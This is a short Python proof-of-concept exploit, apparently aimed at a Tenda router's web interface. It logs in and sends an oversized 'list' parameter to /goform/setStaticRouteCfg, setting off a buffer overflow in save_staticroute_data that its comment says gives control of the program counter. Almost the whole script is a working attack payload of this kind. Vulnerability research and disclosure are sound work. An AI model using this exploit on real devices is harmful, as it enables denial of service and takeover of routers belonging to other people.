#!/usr/bin/env python3

# series of bof in save_staticroute_data, using sscanf to trigger and get $pc to point to 0x626262

import common

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
p = {'list':',,,'+'a'*0x20 + 'bbbb'}
t.post_request('/goform/setStaticRouteCfg', p)
